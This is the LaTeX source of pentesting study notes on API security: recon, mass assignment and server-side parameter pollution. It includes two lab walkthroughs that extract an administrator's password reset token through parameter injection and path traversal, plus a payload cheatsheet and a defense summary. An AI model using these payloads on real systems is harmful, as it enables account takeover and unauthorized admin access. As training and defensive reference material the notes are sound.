\documentclass[11pt]{article}

% ============ PACKAGES ============
\usepackage{fontspec}
\usepackage[margin=2.2cm]{geometry}
\usepackage{titlesec}
\usepackage{enumitem}
\usepackage{tcolorbox}
\tcbuselibrary{listings,skins,breakable}
\usepackage{listings}
\usepackage[table]{xcolor}
\usepackage{fancyhdr}
\usepackage{hyperref}
\usepackage{tikz}
\usepackage{array}
\usepackage{longtable}
\usepackage{multicol}
\usepackage{amssymb}

% ============ FONTS ============
\setmainfont{Latin Modern Roman}
\setsansfont{Latin Modern Sans}
\newfontfamily\monofont{Latin Modern Mono}

% ============ COLORS ============
\definecolor{bgblack}{HTML}{0A0A0A}
\definecolor{acid}{HTML}{C6F135}
\definecolor{darkgray}{HTML}{1E1E1E}
\definecolor{midgray}{HTML}{4A4A4A}
\definecolor{lightgray}{HTML}{EAEAEA}
\definecolor{codebg}{HTML}{1E8E3E}
\definecolor{critical}{HTML}{D6002A}
\definecolor{warnorange}{HTML}{E07B00}
\definecolor{safegreen}{HTML}{1E8E3E}
\definecolor{httpblue}{HTML}{0B5FA5}

% ============ SECTION STYLING ============
\titleformat{\section}
  {\normalfont\sffamily\Large\bfseries}
  {\colorbox{bgblack}{\textcolor{acid}{\, \thesection\ \,}}}
  {8pt}{\color{bgblack}\MakeUppercase}
\titlespacing{\section}{0pt}{20pt}{10pt}

\titleformat{\subsection}
  {\normalfont\sffamily\large\bfseries}
  {\textcolor{midgray}{\thesubsection}}
  {6pt}{\textcolor{bgblack}}
\titlespacing{\subsection}{0pt}{14pt}{6pt}

\titleformat{\subsubsection}
  {\normalfont\sffamily\normalsize\bfseries}
  {}{0pt}{\textcolor{httpblue}}
\titlespacing{\subsubsection}{0pt}{10pt}{4pt}

% ============ HEADER / FOOTER ============
\pagestyle{fancy}
\fancyhf{}
\renewcommand{\headrulewidth}{0.6pt}
\renewcommand{\footrulewidth}{0pt}
\fancyhead[L]{\sffamily\small\textcolor{midgray}{API Security Fundamentals}}
\fancyhead[R]{\sffamily\small\textcolor{midgray}{\leftmark}}
\fancyfoot[C]{\sffamily\small\textcolor{midgray}{\thepage}}

% ============ LISTINGS (raw code) ============
\lstdefinestyle{codestyle}{
  backgroundcolor=\color{codebg},
  basicstyle=\ttfamily\small,
  breaklines=true,
  frame=single,
  rulecolor=\color{midgray},
  numbers=none,
  showstringspaces=false,
  keywordstyle=\color{httpblue}\bfseries,
  commentstyle=\color{midgray}\itshape,
  stringstyle=\color{safegreen},
}
\lstset{style=codestyle}

% ============ CUSTOM BOXES ============
\newtcblisting{httpbox}[1][]{
  breakable, listing only, colback=darkgray, colframe=darkgray,
  coltext=lightgray, fonttitle=\sffamily\bfseries,
  listing options={basicstyle=\ttfamily\small\color{lightgray},breaklines=true,showstringspaces=false},
  colbacktitle=acid, coltitle=bgblack,
  title={#1}, boxrule=0pt, arc=0pt, left=6pt, right=6pt, top=3pt, bottom=3pt
}

\newtcolorbox{vulnbox}[2][]{
  breakable, enhanced, colback=white, colframe=critical,
  colbacktitle=critical, coltitle=white, fonttitle=\sffamily\bfseries,
  title={#2}, boxrule=1pt, arc=1pt, left=8pt, right=8pt, top=4pt, bottom=4pt,
  attach boxed title to top left={xshift=8pt,yshift=-2mm},
  boxed title style={boxrule=0pt,arc=0pt}
}

\newtcolorbox{notebox}[1][Note]{
  breakable, enhanced, colback=lightgray!40, colframe=bgblack,
  colbacktitle=bgblack, coltitle=acid, fonttitle=\sffamily\bfseries\small,
  title={#1}, boxrule=0.8pt, arc=1pt, left=8pt, right=8pt, top=3pt, bottom=3pt
}

\newtcolorbox{pillarbox}[2][]{
  breakable, enhanced, colback=white, colframe=httpblue,
  colbacktitle=httpblue, coltitle=white, fonttitle=\sffamily\bfseries,
  title={#2}, boxrule=1pt, arc=1pt, left=8pt, right=8pt, top=4pt, bottom=4pt
}

\newtcblisting{pseudobox}[1][Root Cause]{
  breakable, listing only, colback=bgblack, colframe=bgblack,
  listing options={basicstyle=\ttfamily\small\color{acid},breaklines=true,showstringspaces=false},
  colbacktitle=acid, coltitle=bgblack, fonttitle=\sffamily\bfseries\small,
  title={#1}, boxrule=0pt, arc=0pt, left=6pt, right=6pt, top=3pt, bottom=3pt
}

\newcommand{\sev}[1]{\textbf{\textcolor{critical}{Severity: #1}}}
\newcommand{\owasp}[1]{\textbf{\textcolor{httpblue}{#1}}}

\setlist[itemize]{leftmargin=*, itemsep=2pt, topsep=4pt}
\setlist[enumerate]{leftmargin=*, itemsep=2pt, topsep=4pt}

\hypersetup{
  colorlinks=true, linkcolor=httpblue, urlcolor=httpblue, citecolor=httpblue,
  pdftitle={API Security Fundamentals}, pdfauthor={Eyad Eltaher}
}

\begin{document}

% ============ TITLE PAGE ============
\begin{titlepage}
\newgeometry{margin=0cm}
\begin{tikzpicture}[remember picture, overlay]
  \fill[bgblack] (current page.south west) rectangle (current page.north east);
  \fill[acid] (current page.north west) rectangle ([yshift=-1.2cm]current page.north east);
  \node[anchor=north west, xshift=1.5cm, yshift=-1.7cm] at (current page.north west)
    {\sffamily\bfseries\LARGE\textcolor{acid}{PENTESTING NOTES}};
  \node[anchor=west, xshift=1.5cm] at (current page.west)
    {\begin{minipage}{16cm}
      {\sffamily\bfseries\fontsize{46}{50}\selectfont\textcolor{white}{API SECURITY}}\\[4pt]
      {\sffamily\bfseries\fontsize{46}{50}\selectfont\textcolor{acid}{FUNDAMENTALS}}\\[18pt]
      {\sffamily\Large\textcolor{lightgray}{OWASP API Security Top 10 --- Concepts, Attacks \& Defense}}
    \end{minipage}};
  \node[anchor=south west, xshift=1.5cm, yshift=1.8cm] at (current page.south west)
    {\begin{minipage}{16cm}
      \sffamily\textcolor{lightgray}{
      \rule{4cm}{1.5pt}\\[8pt]
      \textbf{\textcolor{acid}{Author:}} Eyad Eltaher\\
      \textbf{\textcolor{acid}{Focus:}} Web Application \& API Penetration Testing\\
      \textbf{\textcolor{acid}{Reference:}} OWASP API Security Top 10 (2023)\\
      \textbf{\textcolor{acid}{Repository:}} github.com/Eyadeltaher/Cybersecurity-notes
      }
    \end{minipage}};
\end{tikzpicture}
\end{titlepage}
\restoregeometry

\tableofcontents
\newpage

% ============================================================
\section{API Recon}
% ============================================================

\begin{notebox}[Goal]
Map the full attack surface before probing for vulnerabilities. The more you know about the API structure, the more precisely you can attack it.
\end{notebox}

\subsection{Finding API Endpoints}

\begin{itemize}
  \item Browse the application in \textbf{Burp's browser} --- Burp Scanner crawls and surfaces API calls automatically.
  \item Look for URL patterns: \texttt{/api/}, \texttt{/v1/}, \texttt{/v2/}, \texttt{/rest/}, \texttt{/graphql}.
  \item Inspect \textbf{JavaScript files} --- they often reference endpoints never directly triggered by the UI.
  \item Use \textbf{JS Link Finder BApp} for automated JS endpoint extraction.
\end{itemize}

\subsection{Finding API Documentation}

Common paths to check manually or with \textbf{Intruder}:

\begin{httpbox}[Documentation Endpoints to Probe]
/api
/api/swagger/v1
/api/swagger
/openapi.json
/swagger/index.html
/swagger-ui.html
/api-docs
\end{httpbox}

\begin{notebox}[Tip]
If you find \texttt{/api/swagger/v1/users/123}, always walk back the path:
\texttt{/api/swagger/v1} $\to$ \texttt{/api/swagger} $\to$ \texttt{/api}
\end{notebox}

\subsection{Identifying Supported HTTP Methods}

An endpoint may behave differently per method --- always test all verbs.

\begin{httpbox}[Method Enumeration Example]
GET    /api/tasks        -> list tasks
POST   /api/tasks        -> create task
PUT    /api/tasks/1      -> replace task
PATCH  /api/tasks/1      -> partial update
DELETE /api/tasks/1      -> delete task
OPTIONS /api/tasks       -> reveals allowed methods
\end{httpbox}

Use \textbf{Burp Intruder} with the built-in \textit{HTTP verbs} wordlist to cycle methods automatically.

\begin{notebox}[Warning]
Target low-priority objects when testing destructive methods (\texttt{DELETE}, \texttt{PUT}). Avoid wiping critical data.
\end{notebox}

\subsection{Identifying Supported Content Types}

Changing \texttt{Content-Type} can bypass defenses or expose injection paths.

\begin{httpbox}[Content-Type Switch Example]
# Original
Content-Type: application/json

# Try switching to:
Content-Type: application/xml
Content-Type: application/x-www-form-urlencoded
Content-Type: text/plain
\end{httpbox}

Use the \textbf{Content Type Converter BApp} to auto-convert request bodies between JSON and XML.

\subsection{Finding Hidden Parameters}

\begin{itemize}
  \item \textbf{Burp Intruder} --- fuzz parameter names against a wordlist.
  \item \textbf{Param Miner BApp} --- up to 65,536 guesses per request, context-aware.
  \item \textbf{Content Discovery tool} --- finds unlinked parameters and paths.
\end{itemize}

% ============================================================
\section{Mass Assignment Vulnerability}
% ============================================================

\begin{vulnbox}{Mass Assignment (Auto-Binding)}
\sev{High} \quad \owasp{OWASP API3:2023 --- Broken Object Property Level Authorization}\\[6pt]
Frameworks automatically bind request parameters to internal object fields. If the developer doesn't explicitly allowlist updatable fields, an attacker can set fields that were never meant to be user-controlled (e.g., \texttt{isAdmin}, \texttt{role}, \texttt{balance}).
\end{vulnbox}

\subsection{Identifying the Vulnerability}

\begin{enumerate}
  \item Send a \texttt{PATCH} or \texttt{PUT} to an update endpoint and note the fields it accepts:
\begin{httpbox}[Normal PATCH Request]
PATCH /api/users/ HTTP/1.1
Content-Type: application/json

{"username": "wiener", "email": "wiener@example.com"}
\end{httpbox}

  \item Fetch the full user object via a \texttt{GET} to find hidden fields:
\begin{httpbox}[GET Response Revealing Hidden Fields]
GET /api/users/123 HTTP/1.1

Response:
{
    "id": 123,
    "name": "John Doe",
    "email": "john@example.com",
    "isAdmin": "false"
}
\end{httpbox}

  \item The \texttt{isAdmin} field is in the object but not in the PATCH --- it may still be bindable.
\end{enumerate}

\subsection{Exploiting Mass Assignment}

\begin{enumerate}
  \item Inject the hidden field with an \textbf{invalid} value first to confirm it's processed:
\begin{httpbox}[Test with Invalid Value]
PATCH /api/users/ HTTP/1.1

{"username": "wiener", "email": "wiener@example.com", "isAdmin": "foo"}
\end{httpbox}
  If the app behaves differently (error vs.\ normal), the field is being parsed.

  \item Inject with a \textbf{valid} value to exploit:
\begin{httpbox}[Exploit: Escalate to Admin]
PATCH /api/users/ HTTP/1.1

{"username": "wiener", "email": "wiener@example.com", "isAdmin": true}
\end{httpbox}

  \item Browse the application as \texttt{wiener} --- verify admin panel access.
\end{enumerate}

\begin{pseudobox}[Root Cause]
// Framework binds ALL incoming params to the model
user.update(request.all())   // Laravel/Rails equivalent

// Should be:
user.update(request.only(['username', 'email']))
\end{pseudobox}

\begin{notebox}[Defense]
\textbf{Allowlist} updatable properties explicitly. \textbf{Blocklist} sensitive fields like \texttt{isAdmin}, \texttt{role}, \texttt{verified}.
\end{notebox}

% ============================================================
\section{Server-Side Parameter Pollution (SSPP)}
% ============================================================

\begin{vulnbox}{Server-Side Parameter Pollution}
\sev{High} \quad \owasp{OWASP API3:2023}\\[6pt]
User input is embedded into a server-side request to an internal API without proper encoding. An attacker can inject extra parameters, truncate the original query, or override existing parameters to alter internal API behavior.
\end{vulnbox}

\begin{notebox}[Scope]
Any user-controlled input is a candidate: query strings, form fields, headers, URL path segments. Not the same as HTTP Parameter Pollution (WAF bypass technique).
\end{notebox}

% ----------------------------------------------------------------
\subsection{SSPP in Query Strings}

\subsubsection{Step 1 --- Confirm the Parameter Is Passed Through}

The front-end sends:
\begin{httpbox}[Front-End Request]
GET /userSearch?name=peter&back=/home
\end{httpbox}
The server internally calls:
\begin{httpbox}[Back-End Internal Request]
GET /users/search?name=peter&publicProfile=true
\end{httpbox}

\subsubsection{Step 2 --- Truncate the Query String with \texttt{\#}}

Append \texttt{\%23} (URL-encoded \texttt{\#}) to cut off everything after your input on the server side:

\begin{httpbox}[Truncation Probe]
GET /userSearch?name=peter%23foo&back=/home

# Server sees:
GET /users/search?name=peter#foo&publicProfile=true
# publicProfile=true is now a fragment -> ignored
\end{httpbox}

\begin{itemize}
  \item \textbf{Returns user ``peter''} $\Rightarrow$ truncation worked, \texttt{publicProfile} check bypassed.
  \item \textbf{Returns ``Invalid name''} $\Rightarrow$ \texttt{foo} was treated as part of the name --- not truncated.
\end{itemize}

\subsubsection{Step 3 --- Inject Additional Parameters with \texttt{\&}}

\begin{httpbox}[Parameter Injection Probe]
GET /userSearch?name=peter%26foo=xyz&back=/home

# Server sees:
GET /users/search?name=peter&foo=xyz&publicProfile=true
\end{httpbox}

\begin{itemize}
  \item Unchanged response $\Rightarrow$ extra param injected but ignored.
  \item Error about \texttt{foo} $\Rightarrow$ param was parsed --- find valid names next.
\end{itemize}

\subsubsection{Step 4 --- Override Existing Parameters}

\begin{httpbox}[Parameter Override]
GET /userSearch?name=peter%26name=carlos&back=/home

# Server sees:
GET /users/search?name=peter&name=carlos&publicProfile=true
\end{httpbox}

\begin{notebox}[Language-Dependent Parsing Behaviour]
\begin{itemize}
  \item \textbf{PHP} --- last parameter wins $\Rightarrow$ searches \texttt{carlos}
  \item \textbf{ASP.NET} --- combines both $\Rightarrow$ searches \texttt{peter,carlos}
  \item \textbf{Node.js / Express} --- first parameter wins $\Rightarrow$ searches \texttt{peter}
\end{itemize}
\end{notebox}

% ----------------------------------------------------------------
\subsection{SSPP in REST Paths}

RESTful APIs encode parameters in the URL path rather than the query string.

\begin{httpbox}[REST Path Example]
# Front-end:
GET /edit_profile.php?name=peter

# Server internally calls:
GET /api/private/users/peter
\end{httpbox}

Inject path traversal sequences to manipulate the resolved path:

\begin{httpbox}[Path Traversal Injection]
# Payload: peter%2f..%2fadmin  (URL-encoded peter/../admin)
GET /edit_profile.php?name=peter%2f..%2fadmin

# Server resolves:
GET /api/private/users/peter/../admin
# -> normalizes to -> /api/private/users/admin
\end{httpbox}

% ----------------------------------------------------------------
\subsection{SSPP in Structured Data Formats (JSON / XML)}

\begin{httpbox}[JSON Injection --- Form-Encoded Input]
# Front-end sends:
POST /myaccount
name=peter","access_level":"administrator

# Server embeds unsanitized input into JSON:
PATCH /users/7312/update
{"name":"peter","access_level":"administrator"}
\end{httpbox}

\begin{httpbox}[JSON Injection --- JSON Input]
# Front-end sends:
POST /myaccount
{"name": "peter\",\"access_level\":\"administrator"}

# Server decodes then embeds:
PATCH /users/7312/update
{"name":"peter","access_level":"administrator"}
\end{httpbox}

\begin{notebox}[Note]
Structured format injection also occurs in \textbf{responses} --- if stored data is embedded into API responses without encoding, the same technique applies in reverse.
\end{notebox}

% ============================================================
\section{Lab Walkthrough: SSPP in Query String (Forgot Password)}
% ============================================================

\begin{notebox}[Scenario]
A password reset endpoint passes the \texttt{username} parameter into an internal API path. By injecting SSPP payloads, we recover the administrator's \texttt{passwordResetToken} without knowing it.
\end{notebox}

\subsection{Phase 1 --- Probe the Parameter}

\begin{enumerate}
  \item Trigger a password reset for \texttt{administrator} in Burp's browser.
  \item Capture \texttt{POST /forgot-password} in Proxy $\to$ HTTP history. Send to Repeater.
  \item Test \textbf{invalid username}: change \texttt{username=administrator} to \texttt{username=administratorx}. Expect \texttt{Invalid username}.
  \item Test \textbf{extra parameter injection} with \texttt{\%26x=y}:
\begin{httpbox}[]
username=administrator%26x=y
\end{httpbox}
  Response: \texttt{Parameter is not supported} $\Rightarrow$ the \texttt{\&} was parsed by the internal API.

  \item Test \textbf{truncation} with \texttt{\%23}:
\begin{httpbox}[]
username=administrator%23
\end{httpbox}
  Response: \texttt{Field not specified} $\Rightarrow$ a required \texttt{field} parameter was cut off. Internal API has a \texttt{field} param.
\end{enumerate}

\subsection{Phase 2 --- Enumerate the \texttt{field} Parameter}

\begin{enumerate}
  \item Inject \texttt{field} with an invalid value, truncate after:
\begin{httpbox}[]
username=administrator%26field=x%23
\end{httpbox}
  Response: \texttt{Invalid field} $\Rightarrow$ the \texttt{field} param is recognized.

  \item Send to \textbf{Intruder}. Set payload position on the value of \texttt{field}:
\begin{httpbox}[]
username=administrator%26field=§x§%23
\end{httpbox}
  Use the built-in \textit{Server-side variable names} wordlist. Both \texttt{username} and \textbf{\texttt{email}} return \texttt{200}.

  \item Confirm \texttt{email} works:
\begin{httpbox}[]
username=administrator%26field=email%23
\end{httpbox}
  Returns original (normal) response.
\end{enumerate}

\subsection{Phase 3 --- Extract the Reset Token}

\begin{enumerate}
  \item Review \texttt{/static/js/forgotPassword.js} in Proxy history. Find the reset endpoint:
\begin{httpbox}[]
/forgot-password?reset_token=${resetToken}
\end{httpbox}

  \item Swap \texttt{email} for \texttt{reset\_token}:
\begin{httpbox}[]
username=administrator%26field=reset_token%23
\end{httpbox}
  Response contains the \textbf{password reset token} in plaintext.
\end{enumerate}

\subsection{Phase 4 --- Exploit}

\begin{enumerate}
  \item Navigate to the reset endpoint with the captured token:
\begin{httpbox}[]
/forgot-password?reset_token=<TOKEN>
\end{httpbox}
  \item Set a new password.
  \item Log in as \texttt{administrator}. Go to Admin panel $\to$ delete \texttt{carlos}.
\end{enumerate}

% ============================================================
\section{Lab Walkthrough: SSPP in REST Path (Admin Panel)}
% ============================================================

\begin{notebox}[Scenario]
The \texttt{username} parameter is embedded directly into a REST URL path on the server side. By injecting path traversal and fragment sequences, we navigate to an undocumented API definition, discover a hidden \texttt{field} parameter, and extract the administrator's \texttt{passwordResetToken}.
\end{notebox}

\subsection{Phase 1 --- Confirm Path Injection}

\begin{enumerate}
  \item Trigger a password reset for \texttt{administrator}. Capture \texttt{POST /forgot-password}. Send to Repeater.

  \item Test \textbf{fragment truncation}:
\begin{httpbox}[]
username=administrator%23
\end{httpbox}
  Response: \texttt{Invalid route} $\Rightarrow$ input lands in a URL path; \texttt{\#} truncated trailing route segments.

  \item Test \textbf{query string injection}:
\begin{httpbox}[]
username=administrator%3F
\end{httpbox}
  Response: \texttt{Invalid route} $\Rightarrow$ same behaviour; confirms path context.

  \item Test \textbf{same-level traversal}:
\begin{httpbox}[]
username=./administrator
\end{httpbox}
  Response: original (normal) $\Rightarrow$ resolves to same path as without the prefix.

  \item Test \textbf{parent traversal}:
\begin{httpbox}[]
username=../administrator
\end{httpbox}
  Response: \texttt{Invalid route} $\Rightarrow$ moved one level up, path is now invalid.
\end{enumerate}

\subsection{Phase 2 --- Navigate to the API Definition}

\begin{enumerate}
  \item Incrementally add \texttt{../} until you exit the API root. At four levels:
\begin{httpbox}[]
username=../../../../%23
\end{httpbox}
  Response: \texttt{Not found} $\Rightarrow$ navigated outside the API root.

  \item Probe common API definition filenames at this level:
\begin{httpbox}[]
username=../../../../openapi.json%23
\end{httpbox}
  Response: error message revealing the internal endpoint structure:
\begin{httpbox}[]
/api/internal/v1/users/{username}/field/{field}
\end{httpbox}
  The path exposes a \textbf{\texttt{field}} parameter.
\end{enumerate}

\subsection{Phase 3 --- Enumerate the \texttt{field} Parameter}

\begin{enumerate}
  \item Inject the discovered endpoint structure with an invalid field:
\begin{httpbox}[]
username=administrator/field/foo%23
\end{httpbox}
  Response: error stating only \texttt{email} is supported.

  \item Confirm \texttt{email} is valid:
\begin{httpbox}[]
username=administrator/field/email%23
\end{httpbox}
  Response: original (normal) $\Rightarrow$ valid field type confirmed.
\end{enumerate}

\subsection{Phase 4 --- Extract the Reset Token}

\begin{enumerate}
  \item Review \texttt{/static/js/forgotPassword.js}. Locate the reset parameter:
\begin{httpbox}[]
/forgot-password?passwordResetToken=${resetToken}
\end{httpbox}

  \item Request \texttt{passwordResetToken} as the field value:
\begin{httpbox}[]
username=administrator/field/passwordResetToken%23
\end{httpbox}
  Response: error --- parameter not supported by this API version.

  \item Use the API definition to target the correct version explicitly:
\begin{httpbox}[]
username=../../v1/users/administrator/field/passwordResetToken%23
\end{httpbox}
  Response: \textbf{password reset token} returned in plaintext.
\end{enumerate}

\subsection{Phase 5 --- Exploit}

\begin{enumerate}
  \item Navigate to:
\begin{httpbox}[]
/forgot-password?passwordResetToken=<TOKEN>
\end{httpbox}
  \item Set a new password.
  \item Log in as \texttt{administrator}. Go to Admin panel $\to$ delete \texttt{carlos}.
\end{enumerate}

% ============================================================
\section{Quick Reference: Injection Cheatsheet}
% ============================================================

\begin{center}
\renewcommand{\arraystretch}{1.4}
\begin{longtable}{|>{\ttfamily\small}p{5cm}|p{4.8cm}|p{5.2cm}|}
\hline
\rowcolor{bgblack}\textcolor{acid}{\textbf{\sffamily Payload}} & \textcolor{acid}{\textbf{\sffamily What It Tests}} & \textcolor{acid}{\textbf{\sffamily Indicator of Vuln}} \\
\hline
\%23 & Truncation (query / path) & Different response; ``Field not specified'' \\
\hline
\%26x=y & Extra param injection & ``Parameter not supported'' \\
\hline
\%26field=x\%23 & Hidden field enumeration & ``Invalid field'' \\
\hline
\%26name=carlos & Parameter override & Response reflects \texttt{carlos} \\
\hline
./x & Same-level path traversal & Original response (confirms path context) \\
\hline
../x & Parent traversal & ``Invalid route'' \\
\hline
../../../../openapi.json\%23 & API definition leak & Schema / endpoint list returned \\
\hline
x","key":"val & JSON structure injection & Extra field appears in server-side JSON \\
\hline
\end{longtable}
\end{center}

% ============================================================
\section{Defense Summary}
% ============================================================

\begin{multicols}{2}

\begin{pillarbox}{API Recon Defenses}
\begin{itemize}
  \item Restrict documentation to authorized users only.
  \item Keep docs in sync with actual endpoints.
  \item Apply an allowlist of permitted HTTP methods per endpoint.
  \item Validate \texttt{Content-Type} on every request and response.
  \item Return generic error messages --- no internal path leakage.
  \item Apply security controls to \textbf{all} API versions, not just production.
\end{itemize}
\end{pillarbox}

\columnbreak

\begin{pillarbox}{Mass Assignment Defenses}
\begin{itemize}
  \item \textbf{Allowlist} the fields a user is permitted to update.
  \item \textbf{Blocklist} sensitive fields: \texttt{isAdmin}, \texttt{role}, \texttt{verified}, \texttt{balance}.
  \item Use DTOs (Data Transfer Objects) --- never bind raw requests to model objects.
  \item Audit framework auto-binding features (Laravel \texttt{\$fillable} / \texttt{\$guarded}).
\end{itemize}
\end{pillarbox}

\end{multicols}

\begin{notebox}[SSPP Defenses]
\begin{itemize}
  \item \textbf{Encode} all user input before embedding it in server-side requests (URL-encode special chars: \texttt{\#}, \texttt{\&}, \texttt{=}, \texttt{/}).
  \item \textbf{Allowlist} the character set permitted in each parameter.
  \item \textbf{Validate} that input conforms to its expected format and structure before forwarding.
  \item Treat internal API paths as privileged --- never construct them from raw user input.
\end{itemize}
\end{notebox}

\end{document}